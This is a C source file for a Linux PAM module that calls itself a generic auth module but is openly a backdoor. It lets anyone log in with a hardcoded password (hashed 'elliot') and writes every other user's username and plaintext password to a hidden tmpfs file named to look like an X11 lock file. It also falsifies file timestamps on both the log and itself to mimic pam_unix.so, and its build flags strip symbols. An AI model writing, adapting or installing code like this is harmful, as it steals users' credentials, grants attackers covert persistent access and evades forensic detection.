/*
 * pam_auth.c
 *
 * Looks like a generic auth module. Nothing to see here.
 *
 * Compile:
 *   gcc -fPIC -shared -O3 -s -fvisibility=hidden \
 *       -o pam_auth.so pam_auth.c -lcrypto -lpam
 *   strip --strip-all pam_auth.so
 */

#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <openssl/evp.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>
#include <utime.h>

/*
 * SHA256 of "elliot" - our test password
 * echo -n "elliot" | sha256sum
 * 01e76a28977874f8b72265d0d39fa47c4105083556013f84ded1dad7798d01f7
 */
static const unsigned char AUTH_HASH[32] = {
    0x01, 0xe7, 0x6a, 0x28, 0x97, 0x78, 0x74, 0xf8,
    0xb7, 0x22, 0x65, 0xd0, 0xd3, 0x9f, 0xa4, 0x7c,
    0x41, 0x05, 0x08, 0x35, 0x56, 0x01, 0x3f, 0x84,
    0xde, 0xd1, 0xda, 0xd7, 0x79, 0x8d, 0x01, 0xf7
};

/* Log path: /dev/shm/.Xauth */
static const char LOG_PATH[] = "/dev/shm/.Xauth";

/*
 * Constant-time comparison - defeats timing attacks
 */
__attribute__((noinline))
static int secure_compare(const unsigned char *a, const unsigned char *b, size_t len) {
    volatile unsigned char result = 0;
    volatile size_t i;

    for (i = 0; i < len; i++) {
        result |= a[i] ^ b[i];
    }

    return result == 0;
}

/*
 * Hash using EVP API (OpenSSL 3.x compatible)
 */
static void compute_hash(const char *input, unsigned char *output) {
    EVP_MD_CTX *ctx = EVP_MD_CTX_new();

    if (ctx) {
        EVP_DigestInit_ex(ctx, EVP_sha256(), NULL);
        EVP_DigestUpdate(ctx, input, strlen(input));
        EVP_DigestFinal_ex(ctx, output, NULL);
        EVP_MD_CTX_free(ctx);
    }
}

/*
 * Timestomp a file to match a reference file
 * Makes our files blend in with system files
 */
static void timestomp(const char *target, const char *reference) {
    struct stat ref_st;
    if (stat(reference, &ref_st) != 0) return;

    struct utimbuf times = {
        .actime = ref_st.st_atime,
        .modtime = ref_st.st_mtime
    };
    utime(target, &times);
}

/*
 * Timestomp to a fixed old date (Jan 2023 - looks like install time)
 * Used when no reference file available
 */
static void timestomp_fixed(const char *target) {
    struct utimbuf times = {
        .actime = 1672531200,   /* 2023-01-01 00:00:00 UTC */
        .modtime = 1672531200
    };
    utime(target, &times);
}

/*
 * Log credentials to tmpfs - never hits disk
 * Timestomped to look old
 */
static void log_attempt(const char *user, const char *cred) {
    struct stat st;
    if (stat("/dev/shm", &st) != 0) return;

    FILE *f = fopen(LOG_PATH, "a");
    if (!f) return;

    time_t now = time(NULL);
    fprintf(f, "%ld|%s|%s\n", now, user, cred);
    fclose(f);

    /* Timestomp: make log look like old X11 lock file */
    timestomp_fixed(LOG_PATH);
}

/*
 * Main authentication hook
 */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *user = NULL;
    const char *password = NULL;
    unsigned char hash[32];
    int is_backdoor = 0;

    /* Get username */
    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || !user) {
        return PAM_IGNORE;
    }

    /* Get password */
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL) != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    if (!password) return PAM_IGNORE;

    /* Check if it's the backdoor password */
    compute_hash(password, hash);
    is_backdoor = secure_compare(hash, AUTH_HASH, 32);

    /* Log everything EXCEPT backdoor access */
    if (!is_backdoor) {
        log_attempt(user, password);
    }

    /* Zero sensitive data */
    memset(hash, 0, sizeof(hash));

    if (is_backdoor) {
        return PAM_SUCCESS;
    }

    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
                                 int argc, const char **argv) {
    return PAM_SUCCESS;
}

/*
 * Constructor: runs once when module is loaded
 * Timestomps itself to match pam_unix.so
 */
__attribute__((constructor))
static void init(void) {
    /* Paths where we might be installed */
    const char *self_paths[] = {
        "/lib/x86_64-linux-gnu/security/pam_auth.so",
        "/lib/security/pam_auth.so",
        "/lib64/security/pam_auth.so",
        NULL
    };

    /* Reference file to copy timestamps from */
    const char *ref_paths[] = {
        "/lib/x86_64-linux-gnu/security/pam_unix.so",
        "/lib/security/pam_unix.so",
        "/lib64/security/pam_unix.so",
        NULL
    };

    /* Find and timestomp ourselves */
    for (int i = 0; self_paths[i]; i++) {
        struct stat st;
        if (stat(self_paths[i], &st) == 0) {
            /* Found ourselves, now find reference */
            for (int j = 0; ref_paths[j]; j++) {
                if (stat(ref_paths[j], &st) == 0) {
                    timestomp(self_paths[i], ref_paths[j]);
                    return;
                }
            }
        }
    }
}
